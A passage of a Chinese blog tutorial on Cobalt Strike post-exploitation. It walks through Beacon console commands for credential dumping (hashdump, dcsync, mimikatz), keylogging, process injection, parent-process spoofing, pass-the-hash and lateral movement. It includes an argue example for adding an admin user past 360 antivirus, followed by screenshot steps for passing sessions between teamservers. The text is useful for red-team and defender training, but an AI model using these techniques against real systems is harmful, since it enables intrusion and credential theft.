    <published>2021-07-03T03:35:16.000Z</published>
    <updated>2021-07-03T03:41:16.400Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p><strong>by Tahir 2021.6.8</strong></p><p>接着基础上篇</p><h2 id="4-后渗透"><a href="#4-后渗透" class="headerlink" title="4.后渗透"></a>4.后渗透</h2><h3 id="4-1-会话管理"><a href="#4-1-会话管理" class="headerlink" title="4.1 会话管理"></a>4.1 会话管理</h3><h4 id="4-1-1-Beacon-的管理"><a href="#4-1-1-Beacon-的管理" class="headerlink" title="4.1.1 Beacon 的管理"></a>4.1.1 Beacon 的管理</h4><p>Beacon 控制台</p><p>在一个 Beacon 会话上右击 interact（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p><p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/1.png"></p><p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p><p><strong>Beacon 菜单</strong></p><ul><li><p>Access：包含了一些对凭据的操作及提权的选项</p></li><li><p>Explore：包含了信息探测与目标交互的选项</p></li><li><p>Pivoting：包含了一些设置代理隧道的选项</p></li><li><p>Session：包含了对当前 Beacon 会话管理的选项</p></li></ul><p><strong>Beacon 命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">help 帮助命令显示全部命令</span><br><span class="line">help xxx 显示某个命令的详细信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">argue 进程参数欺骗</span><br><span class="line">argue [command] [fake arguments]argue 命令 假参数 欺骗某个命令参数</span><br><span class="line">argue [command]argue 命令 取消欺骗某个命令参数</span><br><span class="line">利用这个也可以绕过360添加用户（非核晶模式非x86）比如:argue net1 /hello /hello /hello /hello /hellorun net1 user admin 123451 /add注：假参数需要比真命令长</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blockdlls 阻止子进程加载非微软签名的dll</span><br><span class="line">blockdlls [start|stop]blockdlls start 启动此策略blockdlls stop 关闭此策略</span><br><span class="line">启动此策略后创建的子进程加载非微软签名的dll时会被阻止注：此特性是windows10自身特性，需要目标为windows10才能成功启用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 浏览器代理前面介绍过</span><br><span class="line">browserpivot [pid] [x86|x64]</span><br><span class="line">browserpivot [stop]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cancel 取消正在进行的文件下载</span><br><span class="line">cancel filename</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd切换目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkin 强制回连时发送主机信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">covertvpn 部署Covert VPN客户端，注：没啥用的功能不做介绍</span><br><span class="line">covertvpn [interface] [ip address]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear 清空Beacon任务列队</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connect 连接到一个TCP Beacon</span><br><span class="line">connect [target] [port]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp复制文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dcsync从域控中提取密码哈希</span><br><span class="line">dcsync [DOMAIN.FQDN] 提取所有帐户的密码哈希</span><br><span class="line">dcsync [DOMAIN.FQDN] [DOMAIN\user] 特定用户的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desktop VNC远程桌面</span><br><span class="line">desktop pid [x86|x64] low|high 将vnc服务dll注入到指定进程中运行</span><br><span class="line">注：需要确保cs服务端有vnc dll</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dllinject 反射dll进程注入</span><br><span class="line">dllinject pid dllpath</span><br><span class="line">注：路径为本机路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dllload 使用LoadLibrary函数进行dll注入</span><br><span class="line">dllload pid dllpath </span><br><span class="line">注：LoadLibrary函数 dll注入，目标机上必须存在被注入的dll</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download 下载目标机文件</span><br><span class="line">download filepath</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">downloads 列出正在下载的文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drives 列出目标机上所有的磁盘盘符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elevate 提权并生成一个高权限会话</span><br><span class="line">elevate [exploit] [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute 执行程序（无回显）</span><br><span class="line">execute [program] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute-assembly 内存加载执行.NET程序集</span><br><span class="line">execute-assembly .netpath [arguments]</span><br><span class="line">注：就是普通的内存加载执行.net程序</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit 结束Beacon进程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getprivs 启用当前访问令牌所拥有的特权</span><br><span class="line">注：你可以通过shell whoami /all查看详细信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem 尝试模拟一个SYSTEM账号的令牌获取System权限</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid 获取当前令牌关联的用户ID</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump 转储密码哈希</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inject 在指定进程中派生会话</span><br><span class="line">inject [pid] &lt;x86|x64&gt; [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline-execute在Beacon会话中执行Beacon Object File (BOF)</span><br><span class="line">inline-execute [/path/to/file.o] [args]</span><br><span class="line">注：后面会详细讲解</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jobs 查看后渗透任务列表</span><br><span class="line">Beacon中有些功能会在其他进程中运行（例如键盘记录屏幕截图）</span><br><span class="line">这些任务在后台中运行，并在可用时报告其输出</span><br><span class="line">可以使用jobs查看Beacon中的所有任务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jobkill 结束一个在后台运行</span><br><span class="line">jobkill [JID]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jump 在远程主机上执行payload生成一个会话</span><br><span class="line">jump [exploit] [target] [listener]</span><br><span class="line">此命令通过横向渗透在目标上执行payload生成会话(psexec winrm)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge 清除当前shell的Kerberos票据</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入Kerberos票据kerberos_ccache_use [/path/to/file.ccache]</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入Kerberos票据kerberos_ticket_use [/path/to/file.ticket]注：域渗透相关</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keylogger 将键盘记录器注入到一个进程运行</span><br><span class="line">keylogger [pid] [x86|x64] 注入到指定进程</span><br><span class="line">注：不带任何参数则临时生成一个进程注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill 结束指定进程</span><br><span class="line">kill [pid]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">link 前面介绍过了是用来连接SMB Beacon的</span><br><span class="line">link ip pipe name</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords 执行mimikatz获取密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 显示目标机当前目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make_token 创建令牌前面有说过</span><br><span class="line">make_token username pass</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz 执行mimikatz命令</span><br><span class="line">mimikatz [module::command] &lt;args&gt;</span><br><span class="line">mimikatz [!module::command] &lt;args&gt;</span><br><span class="line">mimikatz [@module::command] &lt;args&gt;</span><br><span class="line">注：有些mimikatz命令需要system权限才能运行</span><br><span class="line">!代表强制将mimikatz提升到SYSTEM，然后再运行命令</span><br><span class="line">有些则需要使用Beacon当前访问令牌运行</span><br><span class="line">@代表强制mimikatz使用Beacon当前访问令牌运行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir 在目标机上创建目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mode dns 使用DNS A作为数据通道(仅限DNS Beacon有效)</span><br><span class="line">mode dns6 使用DNS AAAA作为数据通道(仅限DNS Beacon有效)</span><br><span class="line">mode dns-txt 使用DNS TXT作为数据通道(仅限DNS Beacon有效)</span><br><span class="line">注：DNS Beacon默认使用DNS TXT作为数据通道</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv 移动目标机上的文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net 在目标上执行net命</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">note 为当前Beacon会话备注</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portscan 扫描端口</span><br><span class="line">portscan [targets] [ports] [arplicmp Inone] [max connections]</span><br><span class="line">注：前面有说过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powerpick 非托管powershell技术</span><br><span class="line">powerpick [commandlet] [arguments]</span><br><span class="line">注：非托管powershell技术就是不使用powershell.exe程序来执行powershell命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import导入Powershell脚本</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ppid 父进程欺骗</span><br><span class="line">ppid [pid] 将指定进程作为父进程</span><br><span class="line">ppid 直接执行ppid取消父进程欺骗</span><br><span class="line">注：父进程欺骗顾名思义就是伪造子进程的父进程为指定进程。</span><br><span class="line">这个听起来有点绕其实以前对抗过某杀软的应该都知道过父都是为了达到同一个目的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps 显示进程列表</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psinject 在指定进程中执行PowerShell命令</span><br><span class="line">psinject [pid] [arch] [commandLet] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pth hash传递攻击</span><br><span class="line">pth [DOMAIN\user] [NTLM hash]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd显示当前所在目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg 注册表查询命令(仅能查询)</span><br><span class="line">reg query [x86|x64] [root\path]</span><br><span class="line">reg queryv [x86|x64] [root\path] [subkey]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remote-exec 在远程主机上执行命令</span><br><span class="line">remote-exec [method] [target] [command]</span><br><span class="line">和上面那个在远程主机上执行payload生成会话的没啥区别只不过变成了执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev2self 恢复Beacon原始令牌</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm 删除文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 反向端口转发rportfwd [bind port] [forward host] [forward port] 开启端口转发rportfwd stop [bind port] 停止指定端口转发</span><br><span class="line">rportfwd 本机端口 目标ip 目标端口  注：将指定的本机端口转发到目标ip的目标端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run 在目标上执行程序（输出回显）</span><br><span class="line">run [program] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas 以其他用户权限执行程序</span><br><span class="line">runas [DOMAIN\user] [password] [command] [arguments]</span><br><span class="line">注：相当于windows的runas命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runasadmin 提权后执行命令</span><br><span class="line">runasadmin [exploit] [command] [args]</span><br><span class="line">注：与前面的elevate命令相似只不过变成了提权执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runu 父进程欺骗</span><br><span class="line">runu [pid] [command] [arguments]</span><br><span class="line">注：与ppid差不多，runu使用指定进程作为父进程来执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot 截屏</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenv 设置环境变量</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell 通过cmd执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shinject shellcode注入</span><br><span class="line">shinject [pid] &lt;x86|x64&gt; shellcode_raw_path</span><br><span class="line">注：使用时注意目标进程架构</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 设置beacon睡眠时间</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks SOCKS4代理(不建议使用)</span><br><span class="line">socks [stop|port] 停止或在指定端口开启代理</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spawn 派生会话</span><br><span class="line">spawn [x86|x64] [listener]</span><br><span class="line">注：默认情况下，spawn命令会在rundll32.exe中派生会话可以使用spawnto改变此默认</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spawnas 以其他用户身份派生会话</span><br><span class="line">spawnas [DOMAIN\user] [password] [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spawnto 设置Beacon派生会话时使用的程序</span><br><span class="line">spawnto [x86|x64] [程序路径]</span><br><span class="line">注：此命令用来更改Beacon默认派生会话时使用的程序，比如</span><br><span class="line">spawnto x64 C:\Windows\System32\notepad.exe</span><br><span class="line">在派生一个新的x64会话时就会启动一个notepad进程来作为傀儡</span><br><span class="line">直接输入spawnto回车代表清除设置使用默认配置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spawnu 在指定进程中派生会话</span><br><span class="line">spawnu [pid] [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh 使用ssh密码远程连接</span><br><span class="line">ssh [target:port] [user] [pass]</span><br><span class="line">注：通过Beacon内置的ssh客户端实现</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-key 使用SSH密钥远程连接</span><br><span class="line">ssh [target:port] [user] [/path/to/key.pem]</span><br><span class="line">注：和上一个没啥区别</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token 从进程中窃取访问令牌</span><br><span class="line">steal_token [pid]</span><br><span class="line">注：可以使用getuid命令会打印你的当前令牌,rev2self恢复的原始令牌。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp 复制指定文件时间戳到其他文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 断开与子Beacon的连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload 上传文件</span><br></pre></td></tr></table></figure><p><strong>Script Console</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">? 执行sleep判断语句并输出结果</span><br><span class="line">e 执行sleep说明语句</span><br><span class="line">help 帮助</span><br><span class="line">load 加载一个脚本</span><br><span class="line">ls 列出加载的所有脚本</span><br><span class="line">proff 关闭脚本分析器</span><br><span class="line">pron 为开启脚本分析器</span><br><span class="line">profile 脚本性能统计</span><br><span class="line">reload 重新加载脚本</span><br><span class="line">troff 关闭脚本跟踪功能</span><br><span class="line">tron 开启脚本跟踪功能</span><br><span class="line">unload 卸载脚本</span><br><span class="line">x 执行sleep表达式并输出结果</span><br></pre></td></tr></table></figure><h4 id="4-1-2-派生会话-会话传递"><a href="#4-1-2-派生会话-会话传递" class="headerlink" title="4.1.2 派生会话/会话传递"></a>4.1.2 派生会话/会话传递</h4><p><strong>会话传递相关命令</strong></p><p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p><ul><li><p>spawn：进行会话的传递，也可直接右击会话选择spawn命令进行会话的选择。默认情况下，spawn命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用spawnto命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</p></li><li><p>spawnto：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入spawnto命令然后按 enter 会指示 Beacon 恢复至其默认行为。</p></li><li><p>inject：输入inject + 进程 id + 监听器名来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用inject [pid] x64来将一个64位 Beacon 注入到一个 64位进程中。</p></li><li><p>spawn和inject命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</p></li><li><p>dllinject：dllinject + [pid]来将一个反射性 DLL 注入到一个进程中。</p></li><li><p>shinject：使用shinject [pid] [架构] [/路径/…/file.bin]命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</p></li><li><p>shspawn：使用shspawn [架构] [/路径/…/file.bin]命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</p></li><li><p>dllload：使用dllload [pid] [c:\路径...\file.dll]来在另一个进程中加载磁盘上的 DLL文件。</p></li></ul><h5 id="4-1-2-1-CS自身增加会话"><a href="#4-1-2-1-CS自身增加会话" class="headerlink" title="4.1.2.1 CS自身增加会话"></a>4.1.2.1 CS自身增加会话</h5><p>1.首先创建一个新的监听器，用于自身派生会话。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/2.png"></p><p>2.然后在要派生的会话上右键点击Spawn即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/3.png"></p><p>3.选择要派生到刚刚新建的监听器上，点击choose即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/5.png"></p><p>4.可以看到会话成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/4.png"></p><h5 id="4-1-2-2-在其他teamserver上做备份会话"><a href="#4-1-2-2-在其他teamserver上做备份会话" class="headerlink" title="4.1.2.2 在其他teamserver上做备份会话"></a>4.1.2.2 在其他teamserver上做备份会话</h5><p>1.在另一台Linux服务器上开启teamserver。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/6.png"></p><p>2.通过客户端连接上新开启的teamserver。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/7.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/8.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/9.png"></p><p>3.新建一个监听器，用于将会话派生到新开启的teamserver上。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/10.png"></p><p>4.选择将要派生到teamserver的会话，通过spawn模块派生即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/11.png"></p><p>5.在新开启的teamserver上查看会话成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/12.png"></p><h5 id="4-1-2-3-CS派生MSF会话"><a 